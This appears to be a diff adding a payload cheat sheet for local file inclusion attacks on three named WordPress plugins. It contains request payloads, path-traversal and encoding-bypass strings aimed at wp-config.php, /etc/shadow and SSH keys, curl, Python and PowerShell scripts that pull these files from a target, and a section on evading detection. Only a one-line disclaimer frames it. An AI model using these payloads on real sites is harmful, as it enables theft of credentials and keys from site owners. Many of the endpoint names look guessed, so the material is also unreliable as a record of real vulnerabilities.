@@ -1,0 +1,402 @@
+# LFI Payload Collection for WordPress Plugin Exploitation
+
+## BACKUPLY - Payload Collection
+
+### Basic File Read
+```
+POST /wp-admin/admin-ajax.php
+action=backuply_backup&task=restore&file=wp-config.php
+
+POST /wp-admin/admin-ajax.php
+action=backuply_backup&operation=read_file&path=wp-config.php
+
+GET /wp-admin/admin-ajax.php?action=backuply_backup&file=wp-config.php
+```
+
+### Path Traversal Payloads
+```
+wp-config.php
+../wp-config.php
+../../wp-config.php
+../../../wp-config.php
+../../../../wp-config.php
+../../../../../../../../etc/passwd
+../../../../../../../../etc/shadow
+../../../../../../../../etc/hostname
+../../../../../../../../proc/version
+../../../wp-content/debug.log
+../../../wp-content/uploads/index.php
+../../../wp-content/plugins/backuply/backuply.php
+```
+
+### Encoded Payloads
+```
+..%2Fwp-config.php
+..%2F..%2Fwp-config.php
+..%252Fwp-config.php
+%2E%2E%2Fwp-config.php
+..%5Cwp-config.php (for Windows)
+```
+
+### Backup/Restore Actions
+```
+action=backuply_backup&task=restore&file=PAYLOAD
+action=backuply_backup&operation=extract&path=PAYLOAD
+action=backuply_action&operation=read_file&path=PAYLOAD
+action=backuply_admin&method=restore&file=PAYLOAD
+action=backuply_ajax&cmd=read&file=PAYLOAD
+```
+
+---
+
+## ARUBA HISPEED CACHE - Payload Collection
+
+### Settings Page Exploits
+```
+GET /wp-admin/admin.php?page=aruba-hispeed-cache&file=wp-config.php
+GET /wp-admin/admin.php?page=aruba-hispeed-cache&view=wp-config.php
+GET /wp-admin/admin.php?page=aruba-hispeed-cache&include=wp-config.php
+GET /wp-admin/admin.php?page=aruba-hispeed-cache&file_path=wp-config.php
+GET /wp-admin/admin.php?page=aruba-hispeed-cache&include_file=wp-config.php
+```
+
+### Direct Plugin File Access
+```
+GET /wp-content/plugins/aruba-hispeed-cache/admin/pages/AHSC_Settings.php?file=PAYLOAD
+GET /wp-content/plugins/aruba-hispeed-cache/admin/pages/views/admin-settings-new.php?file=PAYLOAD
+GET /wp-content/plugins/aruba-hispeed-cache/admin/pages/views/admin-settings-new.php?include=PAYLOAD
+```
+
+### AJAX Endpoints
+```
+GET /wp-admin/admin-ajax.php?action=ahsc_load_settings&file=PAYLOAD
+GET /wp-admin/admin-ajax.php?action=ahsc_get_file&path=PAYLOAD
+GET /wp-admin/admin-ajax.php?action=ahsc_settings&include=PAYLOAD
+POST /wp-admin/admin-ajax.php [action=ahsc_load_settings&file=PAYLOAD]
+```
+
+### File Parameters
+```
+file=
+view=
+include=
+file_path=
+include_file=
+template=
+load=
+get=
+read=
+```
+
+### Path Traversal Variations
+```
+../wp-config.php
+../../wp-config.php
+../../../wp-config.php
+../../../../wp-config.php
+../../../../../../../../etc/passwd
+../../../wp-content/debug.log
+../../../wp-content/upgrade/index.php
+../../wp-settings.php
+./wp-config.php
+./../wp-config.php
+```
+
+---
+
+## CARTFLOWS - Payload Collection
+
+### Debugger Endpoint
+```
+GET /wp-admin/admin-ajax.php?action=cartflows_debug&file=wp-config.php
+GET /wp-admin/admin-ajax.php?action=cartflows_debug_log&file=PAYLOAD
+GET /wp-admin/admin-ajax.php?action=cartflows_debug&log_file=PAYLOAD
+```
+
+### Log Status Endpoint
+```
+POST /wp-admin/admin-ajax.php
+action=cartflows_get_logs&log_file=wp-config.php
+
+POST /wp-admin/admin-ajax.php
+action=cartflows_log_status&file=PAYLOAD
+
+POST /wp-admin/admin-ajax.php
+action=cartflows_logs&path=PAYLOAD
+```
+
+### Admin Menu Endpoint
+```
+POST /wp-admin/admin-ajax.php
+action=cartflows_admin_menu&file=wp-config.php
+
+POST /wp-admin/admin-ajax.php
+action=cartflows_menu&load=PAYLOAD
+```
+
+### WP-CLI Endpoint
+```
+POST /wp-admin/admin-ajax.php
+action=cartflows_cli&cmd=read&file=PAYLOAD
+```
+
+### Log File Paths to Read
+```
+../../../wp-content/debug.log
+../../../wp-content/logs/woocommerce/fatal-errors.txt
+../../../wp-content/logs/cartflows/error.log
+../../../wp-content/uploads/logs/error.log
+../../../wp-content/cache/debug.log
+../../debug.log
+wp-config.php
+../wp-settings.php
+../wp-load.php
+../../../../etc/passwd
+```
+
+### CartFlows Specific AJAX Actions
+```
+cartflows_debug
+cartflows_debug_log
+cartflows_get_logs
+cartflows_log_status
+cartflows_logs
+cartflows_admin_menu
+cartflows_menu
+cartflows_cli
+cartflows_file
+cartflows_read_file
+cartflows_load_file
+```
+
+---
+
+## Generic LFI Payloads (All Plugins)
+
+### Common WordPress Files
+```
+wp-config.php
+wp-settings.php
+wp-load.php
+wp-blog-header.php
+wp-activate.php
+wp-signup.php
+index.php
+wp-admin/setup-config.php
+wp-content/plugins/index.php
+wp-content/themes/index.php
+wp-content/uploads/index.php
+```
+
+### WordPress Configuration
+```
+.htaccess
+.htpasswd
+wp-content/.htaccess
+wp-admin/.htaccess
+.env
+.env.example
+config.php
+configuration.php
+```
+
+### Debug/Log Files
+```
+wp-content/debug.log
+wp-content/error.log
+wp-content/cache/debug.log
+wp-content/uploads/error.log
+var/log/apache2/access.log
+var/log/apache2/error.log
+var/log/nginx/access.log
+var/log/nginx/error.log
+```
+
+### System Files
+```
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/proc/version
+/proc/self/environ
+/proc/self/cwd/wp-config.php
+```
+
+### SSH/Keys
+```
+.ssh/id_rsa
+.ssh/id_rsa.pub
+.ssh/authorized_keys
+.ssh/config
+```
+
+### Database Files
+```
+wp-content/backup/database.sql
+wp-content/backup-*
+wp-content/updraft/
+backups/
+backup-*
+*.sql
+```
+
+### Theme Files
+```
+wp-content/themes/[theme]/functions.php
+wp-content/themes/[theme]/wp-custom-login.php
+wp-content/themes/[theme]/config.php
+```
+
+### Plugin Files
+```
+wp-content/plugins/woocommerce/woocommerce.php
+wp-content/plugins/elementor/elementor.php
+wp-content/plugins/yoast-seo/wp-seo.php
+wp-content/plugins/[plugin]/index.php
+wp-content/plugins/[plugin]/readme.txt
+```
+
+---
+
+## Encoding Variations
+
+### URL Encoding
+```
+%2e%2e%2f = ../
+%2E%2E%2F = ../
+%252e%252e%252f = ../ (double encoded)
+%c0%ae = ../ (UTF-8)
+```
+
+### Path Traversal Tricks
+```
+..%5c = ..\ (Windows)
+....// = ../  (bypass simple filters)
+..%00 = ../ (null byte)
+.../ = (extra dot)
+./.. = (current dir + parent)
+```
+
+### Action Parameters
+```
+?action=plugin_name
+?action=plugin_name_ajax
+?action=wp_ajax_plugin
+?nopriv=1&action=plugin_action
+?_wpnonce=NONCE&action=action
+```
+
+---
+
+## Bash One-Liners for Testing
+
+```bash
+# Test all three plugins with basic wp-config.php
+for plugin in backuply aruba cartflows; do
+  curl -s "http://target/wp-admin/admin-ajax.php?action=${plugin}&file=wp-config.php" | head -20
+done
+
+# Test path traversal
+for depth in {1..10}; do
+  path=$(printf '../%.0s' {1..$depth})
+  curl -s "http://target/wp-admin/admin-ajax.php?action=backuply_backup&file=${path}etc/passwd" | grep -q "root" && echo "Found at depth $depth"
+done
+
+# Test with different actions
+for action in "cartflows_debug" "cartflows_get_logs" "cartflows_log_status" "cartflows_admin_menu"; do
+  echo "Testing $action..."
+  curl -s "http://target/wp-admin/admin-ajax.php?action=$action&file=wp-config.php" | head -5
+done
+
+# Automated scanning
+curl -s "http://target/wp-admin/admin-ajax.php?action=backuply_backup&file=wp-config.php" -o backuply.txt
+curl -s "http://target/wp-admin/admin.php?page=aruba-hispeed-cache&file=wp-config.php" -o aruba.txt
+curl -s "http://target/wp-admin/admin-ajax.php?action=cartflows_debug&file=wp-config.php" -o cartflows.txt
+```
+
+---
+
+## Python One-Liners
+
+```python
+import requests
+
+# Basic Backuply test
+r = requests.get("http://target/wp-admin/admin-ajax.php", params={"action": "backuply_backup", "file": "wp-config.php"})
+print(r.text[:500])
+
+# Aruba test
+r = requests.get("http://target/wp-admin/admin.php", params={"page": "aruba-hispeed-cache", "file": "../../../../etc/passwd"})
+print(r.text[:500])
+
+# CartFlows test
+r = requests.post("http://target/wp-admin/admin-ajax.php", data={"action": "cartflows_debug", "file": "wp-config.php"})
+print(r.text[:500])
+```
+
+---
+
+## PowerShell One-Liners
+
+```powershell
+# Backuply
+(Invoke-WebRequest -Uri "http://target/wp-admin/admin-ajax.php?action=backuply_backup&file=wp-config.php").Content | Select-Object -First 500
+
+# Aruba
+(Invoke-WebRequest -Uri "http://target/wp-admin/admin.php?page=aruba-hispeed-cache&file=wp-config.php").Content | Select-Object -First 500
+
+# CartFlows
+(Invoke-WebRequest -Uri "http://target/wp-admin/admin-ajax.php" -Method POST -Body @{action="cartflows_debug";file="wp-config.php"}).Content | Select-Object -First 500
+```
+
+---
+
+## Common Response Indicators
+
+### Success Indicators:
+```
+<?php (start of PHP file)
+define('DB_
+[mysqldump (SQL backup)
+root:x:0:0 (etc/passwd format)
+WordPress
+<?xml (XML config)
+json object (API response)
+```
+
+### Error Indicators:
+```
+File not found
+Permission denied
+Cannot open file
+404 Not Found
+Access denied
+Fatal error
+```
+
+---
+
+## Detection Evasion
+
+### Using Different HTTP Methods:
+```
+GET /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
+HEAD /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
+OPTIONS /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
+TRACE /wp-admin/admin-ajax.php?action=backuply&file=wp-config.php
+```
+
+### Adding Noise:
+```
+?action=backuply&file=wp-config.php&randomParam=value&foo=bar&baz=qux
+```
+
+### Timing Delays:
+```bash
+sleep 1 && curl "http://target/wp-admin/admin-ajax.php?action=backuply&file=wp-config.php"
+```
+
+---
+
+*These payloads are for authorized security testing and educational purposes only*
